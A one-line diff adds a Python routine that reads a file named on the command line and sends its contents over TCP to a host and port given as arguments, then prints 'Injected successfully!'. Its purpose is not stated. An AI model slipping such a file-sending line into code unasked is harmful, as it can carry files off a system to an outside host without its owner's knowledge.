@@ -1,0 +1,1 @@
+import socket, sys; f=open(sys.argv[1], "rb"); d=f.read(); f.close(); s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((sys.argv[2], int(sys.argv[3]))); s.sendall(d); s.close(); print("Injected successfully!")
